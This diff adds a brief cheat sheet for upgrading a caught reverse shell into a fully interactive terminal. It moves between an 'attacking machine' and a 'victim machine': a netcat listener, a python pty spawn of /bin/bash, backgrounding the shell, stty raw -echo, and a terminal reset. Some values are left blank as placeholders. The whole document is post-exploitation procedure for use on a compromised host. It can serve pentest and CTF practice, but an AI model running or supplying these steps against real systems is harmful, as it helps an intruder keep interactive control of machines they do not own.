@@ -1,0 +1,29 @@
+## ATTACKING MACHINE
+
+#start bash
+bash
+
+#start listener
+nc -lvp ${PORT}
+
+#catch reverse shell
+
+## FROM REVERSE SHELL ON VICTIM MACHINE
+
+#spawn python bash pty shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+#put reverse shell to sleep
+^Z
+
+## BACK ON ATTACKING MACHINE
+echo $TERM  # record
+stty -a | tail -n 1 | cut -d ";" -f 2-3  # record rows & columns
+stty raw -echo
+fg
+
+## BACK ON VICTIM REVERSE SHELL
+reset
+export SHELL=BASH
+export TERM=
+stty rows # columns #
